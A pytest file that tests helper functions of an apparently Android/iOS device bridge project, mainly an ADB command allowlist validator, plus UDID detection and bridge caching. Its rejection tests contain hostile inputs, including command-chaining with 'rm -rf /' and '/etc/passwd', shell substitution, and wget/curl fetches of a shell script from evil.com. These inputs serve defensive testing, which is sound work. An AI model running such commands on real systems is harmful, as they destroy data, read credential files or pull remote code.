"""Tests for main.py helper functions."""
import pytest
from unittest.mock import patch, MagicMock
import subprocess


class TestValidateAdbCommand:
    """Tests for _validate_adb_command security allowlist."""

    def test_valid_input_text_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("input text hello")
        assert ok is True
        assert reason == "allowed"

    def test_valid_input_tap_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("input tap 100 200")
        assert ok is True

    def test_valid_input_swipe_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("input swipe 100 200 300 400 500")
        assert ok is True

    def test_valid_pm_list_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("pm list packages")
        assert ok is True

    def test_valid_screencap_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("screencap -p")
        assert ok is True

    def test_valid_dumpsys_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("dumpsys battery")
        assert ok is True

    def test_valid_getprop_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("getprop ro.build.version.release")
        assert ok is True

    def test_valid_short_safe_command_ls(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("ls")
        assert ok is True

    def test_valid_short_safe_command_ps(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("ps")
        assert ok is True

    def test_valid_short_safe_command_cat(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("cat /sdcard/test.txt")
        assert ok is True

    def test_reject_empty_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("")
        assert ok is False
        assert "1-500 characters" in reason

    def test_reject_none_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command(None)
        assert ok is False

    def test_reject_command_too_long(self):
        from main import _validate_adb_command
        long_cmd = "input text " + "a" * 500
        ok, reason = _validate_adb_command(long_cmd)
        assert ok is False
        assert "1-500 characters" in reason

    def test_reject_command_with_pipe(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("ls | grep test")
        assert ok is False
        assert "Forbidden character" in reason

    def test_reject_command_with_semicolon(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("ls; rm -rf /")
        assert ok is False
        assert "Forbidden character" in reason

    def test_reject_command_with_double_ampersand(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("ls && cat /etc/passwd")
        assert ok is False
        assert "Forbidden character" in reason

    def test_reject_command_with_backtick(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("echo `whoami`")
        assert ok is False
        assert "Forbidden character" in reason

    def test_reject_command_with_dollar_substitution(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("echo $(whoami)")
        assert ok is False
        assert "Forbidden character" in reason

    def test_reject_reboot_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("reboot")
        assert ok is False
        assert "not allowed" in reason

    def test_reject_shutdown_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("shutdown -h now")
        assert ok is False
        assert "not allowed" in reason

    def test_reject_su_reboot(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("su -c reboot")
        assert ok is False
        # Either blocked as dangerous or not in allowlist
        assert "not allowed" in reason or "not in the allowlist" in reason

    def test_reject_rm_rf(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("rm -rf /")
        assert ok is False
        assert "not allowed" in reason

    def test_reject_wget_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("wget http://evil.com/shell.sh")
        assert ok is False
        assert "not allowed" in reason

    def test_reject_curl_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("curl http://evil.com/shell.sh")
        assert ok is False
        assert "not allowed" in reason

    def test_reject_unknown_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("foobar")
        assert ok is False
        assert "not in the allowlist" in reason

    def test_reject_unknown_with_args(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("foobar --some-flag value")
        assert ok is False
        assert "not in the allowlist" in reason

    def test_case_insensitive_match(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("INPUT TAP 100 200")
        assert ok is True

    def test_leading_whitespace_tolerance(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("  input tap 100 200")
        assert ok is True

    def test_am_start_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("am start -n com.example/.MainActivity")
        assert ok is True

    def test_am_force_stop_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("am force-stop com.example.app")
        assert ok is True

    def test_wm_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("wm size")
        assert ok is True

    def test_monkey_command(self):
        from main import _validate_adb_command
        ok, reason = _validate_adb_command("monkey -p com.example.app -c android.intent.category.LAUNCHER 1")
        assert ok is True


class TestIsIosUdid:
    """Tests for iOS UDID detection."""

    def test_valid_ios_udid(self):
        from main import _is_ios_udid
        # Real iOS UDID format
        assert _is_ios_udid("00001234-0001234567890123") is True
        assert _is_ios_udid("AABBCCDD-1234567890ABCDEF12") is True

    def test_android_serial_not_ios(self):
        from main import _is_ios_udid
        # Android serials are typically shorter
        assert _is_ios_udid("emulator-5554") is False
        assert _is_ios_udid("SERIAL12345") is False
        assert _is_ios_udid("RF8N1234567") is False

    def test_too_short_for_ios(self):
        from main import _is_ios_udid
        assert _is_ios_udid("0000-1234") is False

    def test_contains_non_hex_chars(self):
        from main import _is_ios_udid
        assert _is_ios_udid("00001234-000123456789012G") is False  # G is not hex

    def test_lowercase_accepted(self):
        from main import _is_ios_udid
        assert _is_ios_udid("aabbccdd-1234567890abcdef12") is True


class TestGetBridge:
    """Tests for bridge factory function."""

    def test_get_bridge_with_none_returns_android_bridge(self):
        from main import get_bridge, _android_bridge
        # When no udid provided, it tries to find first android device
        # If _get_first_android_device returns None, it creates a global android bridge
        with patch('main._get_first_android_device', return_value=None):
            result = get_bridge(None)
            # Should be a valid bridge instance
            assert result is not None

    def test_get_bridge_with_ios_udid_returns_ios_bridge(self):
        from main import get_bridge
        with patch('main._is_ios_udid', return_value=True):
            with patch('main._ios_bridges', {}):
                result = get_bridge("00001234-0001234567890123")
                assert result is not None
                # Verify it's from iOS bridges dict
                from main import _ios_bridges
                assert "00001234-0001234567890123" in _ios_bridges

    def test_get_bridge_with_android_serial_returns_android_bridge(self):
        from main import get_bridge
        with patch('main._is_ios_udid', return_value=False):
            with patch('main._android_bridges', {}):
                result = get_bridge("emulator-5554")
                assert result is not None
                from main import _android_bridges
                assert "emulator-5554" in _android_bridges

    def test_get_bridge_reuses_cached_ios_bridge(self):
        from main import get_bridge
        with patch('main._is_ios_udid', return_value=True):
            with patch('main._ios_bridges', {}):
                result1 = get_bridge("00001234-0001234567890123")
                result2 = get_bridge("00001234-0001234567890123")
                assert result1 is result2

    def test_get_bridge_reuses_cached_android_bridge(self):
        from main import get_bridge
        with patch('main._is_ios_udid', return_value=False):
            with patch('main._android_bridges', {}):
                result1 = get_bridge("emulator-5554")
                result2 = get_bridge("emulator-5554")
                assert result1 is result2


class TestGetFirstAndroidDevice:
    """Tests for _get_first_android_device function."""

    def test_returns_first_device_serial(self):
        from main import _get_first_android_device
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="List of devices attached\nemulator-5554\tdevice\nRF8N1234567\toffline\n"
            )
            result = _get_first_android_device()
            assert result == "emulator-5554"

    def test_returns_none_when_no_devices(self):
        from main import _get_first_android_device
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="List of devices attached\n"
            )
            result = _get_first_android_device()
            assert result is None

    def test_returns_none_on_exception(self):
        from main import _get_first_android_device
        with patch('subprocess.run', side_effect=subprocess.TimeoutExpired("cmd", 5)):
            result = _get_first_android_device()
            assert result is None

    def test_handles_device_with_model_info(self):
        from main import _get_first_android_device
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="List of devices attached\nemulator-5554          device product:sdk_google_atd model:SDK device:generic_x86_64\n"
            )
            result = _get_first_android_device()
            assert result == "emulator-5554"
